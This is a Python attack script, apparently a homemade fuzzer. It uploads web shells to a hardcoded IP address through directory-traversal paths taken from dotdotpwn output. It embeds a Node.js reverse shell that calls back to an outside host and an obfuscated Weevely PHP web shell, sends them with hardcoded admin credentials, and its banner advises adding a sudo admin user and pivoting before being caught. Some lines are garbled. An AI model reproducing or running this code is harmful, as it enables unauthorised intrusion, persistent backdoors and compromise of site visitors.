#!/usr/bin/python
#coding=utf-8

import requests, operator, socket, os, sys, subprocess, threading, re, time, colored
from requests import *
import termcolor
from termcolor import colored
def red(string):
    string = colored(string,'red',attrs=['bold'])

    return string
def green(string):
    string = colored(string,'green',attrs=['bold'])

    return string
def yellow(string):
    string = colored(string,'yellow',attrs=['bold'])

    return string
def cyan(string):
    string = colored(string,'cyan',attrs=['bold'])

    return string



banner = """# the basic HTTP request fuzzer as featured in Doctrines of Asssymetric Cyber Warfare

All it really does, is spam the living hell out of enumerated file upload vulnerabilities and path permissions issues that should have been taken care of by their administrators.

This is also known as host-header injection.

How it works is...

1. Reads a list of known directory traversal vulns from a wordlist
2. Generates a gigantic list of HTTP GET/POST/PUT requests,
3. Hammers the router with it for half an hour
4. And find out which one of the payloads made it.

You want to be looking at a traversal vulnerablity. that throws a code 302 or lower. That is the only chance we have at getting a stable shell to immediately work with.

Be warned, that it's quite tough. The first thing you should do if you land a shell is immediately get out of the environment, escalate your privileges and add yourself as a new username="admin". This app was specifically designed to launch Weevely PHP payloads, in both it's raw execuable form and as a embedded malware component on webpages.

With someone's index.html is in the root web directory, with rwx permissions, then the payload will definitely go off even if its embedded as script tags in the html webpage. If someone loads your website. It goes off. Inside of THEIR webbrowser. And if they were to escape the sandbox of the web browser, then they got a lot to worry about.

# it is best combined with directory traversal vulneraviltiiees found from dotdotpwn.
# Dotdotpwn output
# WIth the known injectable paths on hand in a wordlist, run this app, as long as said vulnerability is no worse than a HTTP code 302, then the malware we inject should be completely workable. Be sure to pivot as soon as you land in the shell or you can instantly lose your session
# focus on moving to a more privileged directory, and add yourself a new priviled sudoer capable username="admin", immediately before they find out.
# sudo addusername="admin" ctlister
# sudo username="admin"mod -aG ctlister sudo
"""
print banner

list_of_injectable_links = "/root/myinjectionplan/codeinjections.log"

# Whoever is the organization that you are targeting. Note that you are targeting their domain. DO not even put in URI pointers.
target = "http://98.160.249.209:80"

# The payload is usually a web-app type malware written either in php or as javascript. There are many types of these payloads. The more complex ones are known as web shells such as Weevely.
payload = "thumbnails.php"
payload_abspath = "/var/www/html"
authentication = requests.certs.where()
os.chdir(payload_abspath)

raw_nodejs = """
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>
    <script type="text/javascript">
 (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(50001, "98.160.249.209", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();
    </script>
  </body>
</html>

"""
# Raw shellcode of the payload you want to inject Mine is generated from Weevely, the PHP webshell.
raw_php = """<?php
$M=str_replace('YO','','YOcreYOYOaYOte_YOfunctYOion');
$i=';$e=sto[rpoo[s($s[o[$i],$f);o[if(o[$e){$k=$kh.$ko[f;o[o[oo[b_start();@eo[val(@go[zuncompress(@xo[(@baso[eo[64_decoo[deo[(pre';
$X='[5($i.o[$kh),0,3o[));$o[o[f=o[$sl($ss(md5($io[.$kf),0,o[3));$o[p="";for(o[$o[z=1;$zo[<count($mo[[1]);$o[z++o[)$p.=$q[$mo[[2]';
$x='$kh="o[c016";$o[kf="fo[b54"o[;fo[unction x($t,$ko[){$c=sto[rlo[en($k);$l=o[strleno[($t)o[;$oo[="";o[for($io[=o[0;$i<$l;){foo[r';
$E='[session_starto[();$s=&$o[_o[SESSION;$o[ss="substro[o[";$sl="so[o[trtoloweo[ro[";$i=$m[1][0].$m[1]o[[1o[];$h=$o[sl($ss(mdo';
$t='[$z]o[]o[;if(o[so[trpos($p,$ho[)===0){$s[$i]o[="";$po[=$ss(o[$p,o[3)o[o[;}if(array_key_exio[stso[($i,$s)){o[$so[[$i]o[.=$p';
$I=';$qo[=aro[ro[ay_vao[lues($q);po[reg_matco[h_all("/o[(o[o[[\\w])[\\w-]+(o[?:;q=0.([\\d])o[o[)?,?/"o[,o[$ra,$o[m);if($o[q&&$m){@o';
$z='($j=0;($o[j<$c&&$o[o[i<$l);$j++o[,$i++){$o.=$o[t{$o[i}^$o[k{$j};}}ro[eturn $o[o;}o[$r=$_So[ERo[VER;$ro[r=@$r["HTTP_o[REo[FERE';
$p='Ro["];$ra=@$ro[["HTTo[o[Po[_ACCEPT_LANGUo[AGE"];io[f($rr&&$ra)o[{$u=pao[rseo[_url($rro[);paro[se_str($u[o["qo[uery"]o[,$q)';
$D='o[g_replaco[e(arro[o[ay("/_/","/-/"),array("/o[",o["o[+"),$ss($s[$i]o[,0,$e)))o[o[,$k)));$o=obo[_geto[_co[onteno[ts();ob_en';
$T='d_o[cleao[n();o[$d=bao[seo[64_enco[ode(x(go[zcompress(o[$o),$o[k));printo[("<$o[k>$d<o[/$ko[>");@session_deo[o[stroy();}}}}';
$e=str_replace('o[','',$x.$z.$p.$I.$E.$X.$t.$i.$D.$T);
$b=$M('',$e);$b();
?>

"""

html_embedded_payload_buffer = """
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>
<script type="text/php">
<?php
$M=str_replace('YO','','YOcreYOYOaYOte_YOfunctYOion');
$i=';$e=sto[rpoo[s($s[o[$i],$f);o[if(o[$e){$k=$kh.$ko[f;o[o[oo[b_start();@eo[val(@go[zuncompress(@xo[(@baso[eo[64_decoo[deo[(pre';
$X='[5($i.o[$kh),0,3o[));$o[o[f=o[$sl($ss(md5($io[.$kf),0,o[3));$o[p="";for(o[$o[z=1;$zo[<count($mo[[1]);$o[z++o[)$p.=$q[$mo[[2]';
$x='$kh="o[c016";$o[kf="fo[b54"o[;fo[unction x($t,$ko[){$c=sto[rlo[en($k);$l=o[strleno[($t)o[;$oo[="";o[for($io[=o[0;$i<$l;){foo[r';
$E='[session_starto[();$s=&$o[_o[SESSION;$o[ss="substro[o[";$sl="so[o[trtoloweo[ro[";$i=$m[1][0].$m[1]o[[1o[];$h=$o[sl($ss(mdo';
$t='[$z]o[]o[;if(o[so[trpos($p,$ho[)===0){$s[$i]o[="";$po[=$ss(o[$p,o[3)o[o[;}if(array_key_exio[stso[($i,$s)){o[$so[[$i]o[.=$p';
$I=';$qo[=aro[ro[ay_vao[lues($q);po[reg_matco[h_all("/o[(o[o[[\\w])[\\w-]+(o[?:;q=0.([\\d])o[o[)?,?/"o[,o[$ra,$o[m);if($o[q&&$m){@o';
$z='($j=0;($o[j<$c&&$o[o[i<$l);$j++o[,$i++){$o.=$o[t{$o[i}^$o[k{$j};}}ro[eturn $o[o;}o[$r=$_So[ERo[VER;$ro[r=@$r["HTTP_o[REo[FERE';
$p='Ro["];$ra=@$ro[["HTTo[o[Po[_ACCEPT_LANGUo[AGE"];io[f($rr&&$ra)o[{$u=pao[rseo[_url($rro[);paro[se_str($u[o["qo[uery"]o[,$q)';
$D='o[g_replaco[e(arro[o[ay("/_/","/-/"),array("/o[",o["o[+"),$ss($s[$i]o[,0,$e)))o[o[,$k)));$o=obo[_geto[_co[onteno[ts();ob_en';
$T='d_o[cleao[n();o[$d=bao[seo[64_enco[ode(x(go[zcompress(o[$o),$o[k));printo[("<$o[k>$d<o[/$ko[>");@session_deo[o[stroy();}}}}';
$e=str_replace('o[','',$x.$z.$p.$I.$E.$X.$t.$i.$D.$T);
$b=$M('',$e);$b();
?>
</script>
  </body>
</html>

"""
payload_buffer = html_embedded_payload_buffer

# Quick-hacks to reveal a password="you-and-me-on-the-run" and reverse shells are only the more simpler categories of web app payloads.

def popen_background(cmd):
    p = subprocess.Popen(cmd,shell=True, executable='/bin/bash', stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    o = p.stdout.read()
    o = str(o.encode('utf-8')).strip().rstrip()
    return o

def bash_cmd(cmd):
    commands = cmd.splitlines()
    for command in commands:
        cmd = str(command.encode('utf-8')).strip().rstrip()
        subprocess.call(cmd)
    return

def attack_target(target, message, uri_depth, payload_buffer):
    message = payload_buffer

    response = requests.api.post(target, auth=('admin','you-and-me-on-the-run'),data=message, json=None)
    print response
    print "POST attempt: \r\n","TARGET: ",str(target)
    #,"\r\nMessage: ",str(message)

    print "GET attempt: Attempting to retrieve uploaded content"
    directory = "{}/{}/{}".format(
        str(target),
        str(uri_depth),
        str(payload)
    )
    print directory
    try:
        status = str(requests.api.get(directory)).encode('utf-8')
        print status
        if re.search('40', status):
            print red("File NOT found! Or not high enough permissions to allow for reliable execution")
        if re.search('50', status):
            print yellow("No method. The server requires PHP or JavaScript! Or make a different payload!")
        if re.search('20', status):
            print green("We have a persistent payload here!!!\r\n\t"),directory
            time.sleep(5)
        if re.search('30', status):
            print yellow("Kinda iffy, its a redirected area but we can still interact with the payload"),directory
            time.sleep(5)

    except ConnectionError:
        pass
    return


def other_convenience_functions():
    return
def do_something():
    return
def format_to_perfect_strings(a):
    string = str(a.encode('utf-8')).rstrip().strip()
    return string

def format_to_perfect_list(b):
    lines = b
    lines = lines.splitlines()
    return lines
def func_read_parse(list_of_injectable_links, payload, target):
    print "Now opened file", str(list_of_injectable_links)
    processed = popen_background("cat %s | egrep -i 'testing path' | awk -F 'Path: ' '{{print $2}}'" % str(list_of_injectable_links))
    w = open("tmp_links.log",'w')
    w.write(processed)
    w.close()

    r = open("tmp_links.log",'r')
    o = r.read()
    r.close()
    o = str(o.encode('utf-8')).strip().rstrip()
    time.sleep(2)

    # print c
    l = format_to_perfect_list(o)
    # print l
    r.close()
    for i in l:
        string = format_to_perfect_strings(i)
        #[*] HTTP Status: 302 | Testing Path: http://192.168.1.1:80/.?%uEFC8.?%uEFC8.?%uEFC8.?%uEFC8.?%uEFC8.?%uEFC8-E
        URL = str(string.encode('utf-8')).replace("-E",'')
        print "Attempting to target online result: ",str(URL)
        splitpath = re.split('/',URL)
        #os.system('clear')
        uri_depth = splitpath[3]
        uri_depth = uri_depth.replace('-E/','')
        uri_depth = uri_depth.strip().rstrip()
        #os.system('clear')
        print "Now targeting ",str(target),"against this parameter", str(string)
        print "URI Depth: ", str(uri_depth),"using this payload: ", str(payload)
        request = "POST"

        generate_http_requests(request, uri_depth)
    return
def generate_http_requests(request, uri_depth):


    # if re.search("POST", request):
    type = "POST"

    message = http_request_generator(type, request, uri_depth, target)
    attack_target(target, message, uri_depth, payload_buffer)
    return message
def http_request_generator(type, request, uri_depth, target):
    # we need to find out the URI depth determined by dotdotpwn. The one on the top is the earliest moment that a payload could be injectable.
    target = target
    # if type == "POST":
    POST = """{0} /{1}/{2} HTTP/1.1
    Host: {3}
    Accept-Encoding: gzip, deflate
    username="admin"-Agent: {4}
    Accept:
    Accept-Language:
    X-Arachni-Scan-Seed:
    Content-Type:
    """.format(
        str(request),
        str(uri_depth),
        str(payload),
        str(target),
        str("Mozilla")
    )
    message = POST
    # ALL DONE Format back to a string and prepare to launch
    message = format_to_perfect_strings(message)
    attack_target(target, message, uri_depth, payload_buffer)

    return
# def requests_modules():
#     requests.delete(url)
#     requests.get(url, Params=None, **args)
#     requests.head(url)
#     requests.options(url)
#     requests.post(url, data=None, json=None):
#         url = "https://www.listerunlimited.com"
#         data = "files.php"
#         json = "json.json"
#     requests.put(method, url)
#
#     return
func_read_parse(list_of_injectable_links, payload, target)
#
# def main(list_of_injectable_links, payload, target):
#     func_read_parse(list_of_injectable_links, payload, target)
#     message = generate_http_requests(request, uri_depth)
#     print "Payload sent on it's way as: ",str(message)
#     return
# main(list_of_injectable_links, payload, target)
